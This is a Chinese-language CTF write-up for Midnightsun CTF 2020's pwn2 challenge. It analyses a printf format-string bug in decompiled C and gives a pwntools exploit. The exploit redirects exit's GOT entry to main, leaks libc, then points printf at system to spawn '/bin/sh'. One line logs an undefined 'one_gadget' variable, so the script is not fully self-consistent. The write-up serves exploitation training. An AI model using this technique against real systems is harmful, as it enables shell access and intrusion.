
## pwn2
- 题目描述：
  
    > An homage to pwny.racing, we present... speedrun pwn challenges.
    > These bite-sized challenges should serve as a nice warm-up for your pwning skills.
- 题目附件：[pwn2](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MidnightsunCTF2020/pwn/pwn2/pwn2)
- 考察点：格式化字符串
- 难度：一般
- 初始分值：100
- 最终分值：80
- 完成人数：108

### 程序分析
程序中存在格式化字符串漏洞，`printf`随后调用`exit(0)`，由于没开PIE，可以改`exit`的GOT表，返回`main`，重复利用格式化字符串漏洞。

```c
void main(void){
  int iVar1;
  undefined4 *puVar2;
  int in_GS_OFFSET;
  undefined4 buf;
  undefined4 local_50 [15];
  undefined4 local_14;
  undefined *puStack16;
  
  puStack16 = &stack0x00000004;
  local_14 = *(undefined4 *)(in_GS_OFFSET + 0x14);
  buf = 0;
  iVar1 = 0xf;
  puVar2 = local_50;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  alarm(0x3c);
  banner();
  printf("input: ");
  fgets((char *)&buf,0x40,stdin);
  printf((char *)&buf);
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

### 解题思路
第一次格式化字符串改`exit`的GOT为`main`同时泄漏`libc`

第二次改`printf`的GOT为`system`，执行`system('/bin/sh')`

```python
main = 0x080485eb

# fmt1 exit->main, leak
fmt = fmtstr_payload(7,{elf.got['exit']:main},write_size='byte')
fmt+= 'AAAA%27$p'
sla('input: ',fmt)
ru('AAAA')
# leak
libc_start_main_241 = eval(rc(10))
info_addr('libc_start_main_241',libc_start_main_241)
libcbase = libc_start_main_241-241-libc.sym['__libc_start_main']
info_addr('libcbase',libcbase)
system = libcbase+libc.sym['system']
info_addr('one_gadget',one_gadget)
# fmt2 printf->system
fmt2 = fmtstr_payload(7,{elf.got['printf']:system},write_size='short')
# debug()
sla('input: ',fmt2)
sl('/bin/sh\0')

p.interactive()
```

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/MidnightsunCTF2020/pwn/pwn2) 

